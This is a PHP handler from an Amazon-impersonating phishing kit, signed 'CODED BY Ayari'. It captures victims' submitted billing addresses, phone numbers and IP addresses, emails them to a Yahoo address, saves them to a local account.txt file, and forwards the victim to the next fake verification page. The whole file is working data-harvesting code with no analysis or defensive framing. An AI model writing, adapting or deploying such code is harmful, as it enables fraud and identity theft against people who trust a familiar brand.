<?
@$_SESSION['FullName'] = @$_POST['FullName'];
@$_SESSION['AddressLine1'] = @$_POST['AddressLine1'];
@$_SESSION['AddressLine2'] = @$_POST['AddressLine2'];
@$_SESSION['City'] = @$_POST['City'];
@$_SESSION['StateOrRegion'] = @$_POST['StateOrRegion'];
@$_SESSION['PostalCode'] = @$_POST['PostalCode'];
@$_SESSION['CountryCode'] = @$_POST['CountryCode'];
@$_SESSION['enterAddressPhoneNumber'] = @$_POST['enterAddressPhoneNumber'];
$ip = getenv("REMOTE_ADDR");
$message .= "			<style type='text/css'>
			*{
				font-family: arial;
			}
			font{
				color: #4EC353;
			}
			</style>
			<div style='font-weight: 800;color: #FFFFFF;background: #C6AC00;font-size: 14px;border: 1px solid #06F;padding: 8px;border-radius: 5px 5px 0px 0px;font-size: 17px;'>Ayari | Amazon | Billing Address </div>
			<div style='font-weight: 800;border: 1px solid #06F;padding: 8px;'>
			<p>Full Name : <font>".@$_SESSION['FullName']."</font><p>
			<p>Address line 1  : <font>".@$_SESSION['AddressLine1']."</font><p>
			<p>Address line 2 : <font>".@$_SESSION['AddressLine2']."</font><p>
			<p>City          : <font>".@$_SESSION['City']."</font><p>
			<p>State/Province/Region : <font>".@$_SESSION['StateOrRegion']."</font><p>
			<p>ZIP : <font>".@$_SESSION['PostalCode']."</font><p>
			<p>Country : <font>".@$_SESSION['CountryCode']."</font><p>
			<p>Phone number : <font>".@$_SESSION['CountryCode']."</font><p>	
			<div style='font-weight: 800;border: 1px solid #06F;padding: 8px;'>			
			<p>IP : <font>".$ip."</font><p>
			</div>
			<div style='font-weight: 800;border: 1px solid #06F;padding: 8px;'>
			<center>CODED BY Ayari</center>
			</div>
			";
$hostname = gethostbyaddr($ip);
$headers  = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From:Ayari" . "\r\n";
$subject  = " Amazon Billing Address -  [ " .$ip. " ]";
$send = "logerloger@yahoo.com";
mail($send,$subject,$message,$headers);

header("Location: ../billing.php?7fedf89c7418d32bf350021-billing_virefication4d9fd0fedf89c7418d32bf5");
$file = fopen("../account.txt","a");
fwrite($file, $message);
?>